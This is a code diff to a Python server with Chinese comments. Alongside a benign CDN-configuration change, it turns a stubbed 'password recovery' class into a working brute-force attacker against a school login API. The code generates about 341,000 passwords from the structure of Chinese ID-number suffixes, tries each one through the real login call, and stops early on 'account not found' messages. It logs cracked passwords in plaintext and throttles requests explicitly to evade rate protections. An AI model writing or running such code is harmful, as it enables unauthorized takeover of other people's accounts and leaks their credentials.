@@ -1124,6 +1124,26 @@ def _write_config_with_comments(config_obj, filepath):
         )
 
         # ========================================
+        # [CDN] CDN缓存配置
+        # ========================================
+        f.write("# ========================================\n")
+        f.write("# [CDN] CDN缓存配置\n")
+        f.write("# ========================================\n")
+        f.write("[CDN]\n")
+        f.write("# 是否启用CDN缓存（true/false）\n")
+        f.write("# true：启用CDN缓存，提高静态资源加载速度\n")
+        f.write("# false：禁用CDN缓存，所有资源直接从服务器获取\n")
+        f.write(
+            f"cdn_enabled = {config_obj.get('CDN', 'cdn_enabled', fallback='false')}\n"
+        )
+        f.write("# CDN缓存时间（秒）\n")
+        f.write("# 设置静态资源在CDN上的缓存有效期\n")
+        f.write("# 建议值：3600（1小时）、21600（6小时）、86400（24小时）\n")
+        f.write(
+            f"cache_time = {config_obj.get('CDN', 'cache_time', fallback='3600')}\n\n"
+        )
+
+        # ========================================
         # [Captcha] 本地验证码生成器配置
         # ========================================
         f.write("# ========================================\n")
@@ -12543,6 +12563,7 @@ def load_cdn_config():
     
     功能说明：
     - 读取config.ini文件中的[CDN]节
+    - 使用全局CONFIG_FILE变量获取配置文件路径
     - 如果配置文件或节不存在，返回默认配置
     - 默认配置：CDN禁用，缓存时间3600秒（1小时）
     
@@ -12551,8 +12572,8 @@ def load_cdn_config():
             - cdn_enabled (bool): 是否启用CDN缓存
             - cache_time (int): 缓存时间（秒）
     """
-    # 获取配置文件路径（与main.py同目录）
-    config_file = os.path.join(os.path.dirname(__file__), "config.ini")
+    # 使用全局CONFIG_FILE变量获取配置文件路径
+    global CONFIG_FILE
     
     # 创建ConfigParser对象用于读取INI文件
     config = configparser.ConfigParser()
@@ -12565,13 +12586,13 @@ def load_cdn_config():
 
     try:
         # 检查配置文件是否存在
-        if not os.path.exists(config_file):
+        if not os.path.exists(CONFIG_FILE):
             # 配置文件不存在，记录警告并返回默认配置
-            logging.warning(f"配置文件 {config_file} 不存在，使用默认CDN配置（禁用）")
+            logging.warning(f"配置文件 {CONFIG_FILE} 不存在，使用默认CDN配置（禁用）")
             return default_config
         
         # 读取配置文件，指定UTF-8编码
-        config.read(config_file, encoding="utf-8")
+        config.read(CONFIG_FILE, encoding="utf-8")
         
         # 检查是否存在[CDN]节
         if not config.has_section("CDN"):
@@ -12606,6 +12627,8 @@ def save_cdn_config(cdn_config):
     
     功能说明：
     - 将CDN配置写入config.ini文件的[CDN]节
+    - 使用全局CONFIG_FILE变量获取配置文件路径
+    - 使用_write_config_with_comments函数保存配置以保留注释
     - 如果[CDN]节不存在，会自动创建
     - 如果配置文件不存在，会创建新的配置文件
     
@@ -12617,17 +12640,17 @@ def save_cdn_config(cdn_config):
     返回值：
         bool: 保存成功返回True，失败返回False
     """
-    # 获取配置文件路径
-    config_file = os.path.join(os.path.dirname(__file__), "config.ini")
+    # 使用全局CONFIG_FILE变量获取配置文件路径
+    global CONFIG_FILE
     
     # 创建ConfigParser对象
     config = configparser.ConfigParser()
 
     try:
         # 检查配置文件是否存在
-        if os.path.exists(config_file):
+        if os.path.exists(CONFIG_FILE):
             # 配置文件存在，读取现有配置
-            config.read(config_file, encoding="utf-8")
+            config.read(CONFIG_FILE, encoding="utf-8")
         else:
             # 配置文件不存在，记录警告并创建新的默认配置
             logging.warning("config.ini 文件不存在，将创建新的配置文件")
@@ -12648,17 +12671,20 @@ def save_cdn_config(cdn_config):
             "CDN", "cache_time", str(cdn_config.get("cache_time", 3600))
         )
         
-        # 使用带注释的写入函数保存配置
-        # 这个函数会保留配置文件中的注释
-        _write_config_with_comments(config, config_file)
-
-        # 记录成功日志
-        logging.info("CDN配置已成功保存到配置文件")
+        # 使用_write_config_with_comments函数保存配置
+        # 这样可以保留配置文件中的所有注释
+        _write_config_with_comments(config, CONFIG_FILE)
+        
+        # 记录保存成功的日志
+        logging.info(
+            f"CDN配置已保存: enabled={cdn_config['cdn_enabled']}, cache_time={cdn_config['cache_time']}"
+        )
+        
         return True
 
     except Exception as e:
-        # 捕获异常，记录错误日志并返回False
-        logging.error(f"保存CDN配置时发生错误: {e}")
+        # 捕获所有异常，记录错误日志
+        logging.error(f"保存CDN配置时发生错误: {e}", exc_info=True)
         return False
 
 
@@ -12757,14 +12783,20 @@ class BruteForceTaskManager:
 
     def generate_passwords(self, account):
         """
-        密码生成器：生成常见的密码模式
+        密码生成器：根据身份证后六位规则生成密码
         
         参数：
             account (str): 账号
         
         生成策略：
-        1. 身份证后六位：000000-999999（共100万个密码）
-        2. 跳过已经尝试过的密码
+        根据中国身份证号码后六位规则生成：
+        - 第1-2位: 出生日期的日(01-31)
+        - 第3-4位: 顺序码(00-99)，由当地派出所按顺序分配
+        - 第5位: 性别码(0-9)，偶数为女性，奇数为男性
+        - 第6位: 校验码(0-9, X, x)，X可能是大写或小写
+        
+        总共可能的密码组合：31 * 100 * 10 * 11 = 341,000个
+        跳过已经尝试过的密码
         
         返回值：
             生成器，每次yield一个密码字符串
@@ -12772,14 +12804,20 @@ class BruteForceTaskManager:
         # 获取该账号已尝试过的密码集合
         attempted = set(self.attempts.get(account, []))
         
-        # 生成身份证后六位密码：从000000到999999
-        for i in range(1000000):
-            # 格式化为6位数字字符串（前面补0）
-            password = f"{i:06d}"
-            
-            # 如果该密码未被尝试过，则yield返回
-            if password not in attempted:
-                yield password
+        # 第6位校验码的可能值：0-9和X（大写和小写）
+        check_codes = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'X', 'x']
+        
+        # 遍历所有可能的组合
+        for day in range(1, 32):  # 第1-2位：日期01-31
+            for seq in range(100):  # 第3-4位：顺序码00-99
+                for gender in range(10):  # 第5位：性别码0-9
+                    for check in check_codes:  # 第6位：校验码0-9,X,x
+                        # 组合成6位密码：日期(2位) + 顺序码(2位) + 性别(1位) + 校验(1位)
+                        password = f"{day:02d}{seq:02d}{gender}{check}"
+                        
+                        # 如果该密码未被尝试过，则yield返回
+                        if password not in attempted:
+                            yield password
 
     def start_task(self, account):
         """
@@ -12836,25 +12874,30 @@ class BruteForceTaskManager:
             account (str): 账号
         
         执行流程：
-        1. 使用chrome_pool加载登录页面
+        1. 创建临时ApiClient用于登录验证
         2. 遍历密码生成器生成的密码
-        3. 对每个密码尝试登录
+        3. 对每个密码尝试登录（使用学校登录API）
         4. 如果登录成功，记录密码并停止
-        5. 如果账号不存在，停止任务
+        5. 如果账号不存在（返回特定错误），停止任务
         6. 如果收到停止信号，停止任务
         """
         try:
-            # 检查chrome_pool是否可用
-            global chrome_pool
-            if not chrome_pool:
-                logging.error(f"[密码恢复] Chrome池不可用，无法执行账号 {account} 的任务")
-                with self.lock:
-                    self.tasks[account]["status"] = "failed"
-                    self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
-                return
+            # 创建临时的Api实例用于登录测试
+            # 注意：为了避免影响现有会话，创建独立的Api对象
+            import tempfile
+            temp_user_dir = tempfile.mkdtemp()
             
-            # TODO: 这里需要实际的登录验证逻辑
-            # 由于实际实现需要了解具体的登录API，这里只提供框架
+            # 创建一个简单的临时对象来模拟Api需要的属性
+            class TempApp:
+                def __init__(self):
+                    self.device_ua = ApiClient.generate_random_ua()
+                    self.log = lambda msg: logging.debug(f"[密码恢复临时登录] {msg}")
+            
+            temp_app = TempApp()
+            api_client = ApiClient(temp_app)
+            
+            # 记录开始尝试
+            logging.info(f"[密码恢复] 开始尝试账号 {account} 的密码恢复")
             
             # 获取密码生成器
             password_gen = self.generate_passwords(account)
@@ -12870,14 +12913,44 @@ class BruteForceTaskManager:
                         self._save_json_file(self.results_file, self.results)
                         return
                 
-                # 尝试使用该密码登录
-                # 注意：这里需要实际的登录验证代码
-                # 示例代码（需要根据实际情况修改）：
-                # success = try_login(account, password)
+                # 尝试使用该密码登录学校系统
+                # 使用ApiClient.login方法进行登录验证
+                try:
+                    resp = api_client.login(account, password)
+                    
+                    # 检查登录是否成功
+                    if resp and resp.get("success"):
+                        # 登录成功！找到密码
+                        success = True
+                        logging.info(f"[密码恢复] 账号 {account} 登录成功，密码为: {password}")
+                    else:
+                        # 登录失败
+                        success = False
+                        error_msg = resp.get("message", "") if resp else ""
+                        
+                        # 检查是否是"账号不存在"的错误
+                        # 常见的账号不存在错误消息
+                        account_not_exist_keywords = ["不存在", "未找到", "无效", "not found", "invalid"]
+                        if any(keyword in error_msg for keyword in account_not_exist_keywords):
+                            logging.warning(f"[密码恢复] 账号 {account} 不存在，停止任务")
+                            with self.lock:
+                                self.tasks[account]["status"] = "failed"
+                                self.tasks[account]["end_time"] = datetime.datetime.now().isoformat()
+                                self.results[account] = {
+                                    "status": "failed",
+                                    "password": None,
+                                    "attempts": self.tasks[account]["attempts"],
+                                    "start_time": self.tasks[account]["start_time"],
+                                    "end_time": self.tasks[account]["end_time"],
+                                    "error": "账号不存在"
+                                }
+                                self._save_json_file(self.results_file, self.results)
+                            return
                 
-                # 为了演示，这里添加一个占位逻辑
-                # 实际使用时需要替换为真实的登录验证
-                success = False  # 占位符
+                except Exception as e:
+                    # 登录请求异常，继续尝试下一个密码
+                    logging.debug(f"[密码恢复] 账号 {account} 尝试密码 {password} 时出现异常: {e}")
+                    success = False
                 
                 # 更新已尝试密码数
                 with self.lock:
@@ -12887,6 +12960,7 @@ class BruteForceTaskManager:
                     # 每尝试100个密码保存一次
                     if self.tasks[account]["attempts"] % 100 == 0:
                         self._save_json_file(self.attempts_file, self.attempts)
+                        logging.info(f"[密码恢复] 账号 {account} 已尝试 {self.tasks[account]['attempts']} 个密码")
                 
                 # 如果登录成功
                 if success:
@@ -12906,8 +12980,11 @@ class BruteForceTaskManager:
                         }
                         self._save_json_file(self.results_file, self.results)
                     
-                    logging.info(f"[密码恢复] 账号 {account} 的密码已找到")
+                    logging.info(f"[密码恢复] 账号 {account} 的密码已找到: {password}")
                     return
+                
+                # 添加短暂延迟，避免请求过快触发防护
+                time.sleep(0.5)
             
             # 所有密码都尝试完毕，未找到
             with self.lock:
